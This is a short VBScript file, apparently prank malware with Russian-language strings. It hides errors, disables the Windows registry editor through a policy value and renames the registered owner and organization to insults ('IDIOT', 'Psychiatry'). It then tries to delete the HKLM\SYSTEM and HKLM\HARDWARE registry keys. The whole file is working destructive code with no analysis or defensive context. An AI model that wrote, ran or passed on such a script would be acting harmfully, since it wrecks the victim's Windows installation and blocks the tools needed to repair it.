Set FileSystemObject = CreateObject("scripting.filesystemobject")
Set Shell = CreateObject("Wscript.Shell")
t = 0: On Error Resume Next ' Пропускать ошибки
Set Application = CreateObject("Shell.Application")
Set InternerExplorer = WScript.CreateObject("InternetExplorer.Application")
Set Outlook = WScript.CreateObject("Outlook.Application")

Application.MinimizeAll

Shell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM\DisableRegistryTools", 1, "REG_DWORD"

Shell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", "ИДИОТ"

Shell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOrganization", "Психиатрия"

Shell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\RegisteredOwner", "ИДИОТ"

Shell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\RegisteredOrganization", "Психиатрия"

Shell.RegDelete "HKEY_LOCAL_MACHINE\SYSTEM"

Shell.RegDelete "HKEY_LOCAL_MACHINE\HARDWARE"